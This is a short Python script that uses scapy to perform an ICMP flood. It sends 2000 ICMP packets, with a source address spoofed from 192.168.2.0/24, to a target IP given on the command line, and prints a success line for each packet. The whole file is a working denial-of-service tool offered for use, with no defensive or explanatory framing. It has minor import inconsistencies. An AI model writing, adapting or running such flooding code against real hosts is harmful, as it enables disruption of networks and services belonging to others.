from scapy.all import *
from scapy.layers.inet import *
from ipaddress import ip_network

def create_ip():
    from random import choice  
    ip_pool = []
    for ip in ip_network("192.168.2.0/24"):
        ip_pool.append(ip)
    return str(random.choice(ip_pool))

def ICMP_FLOOD(src_ip,dst_ip):
    from random import randint
    attack_data_package = IP(src = src_ip , dst = dst_ip , id = random.randint(100,1000))/ICMP(id = random.randint(100,1000) , seq = random.randint(100,1000))/"5656566"
    for i in range(2000):
        print(f"[+]rip:{src_ip}--->dip:{dst_ip} Ok !")
        send(attack_data_package,verbose=False)
def main():
    import sys
    ICMP_FLOOD(create_ip(),str(sys.argv[1]))

if __name__ == '__main__':
    main()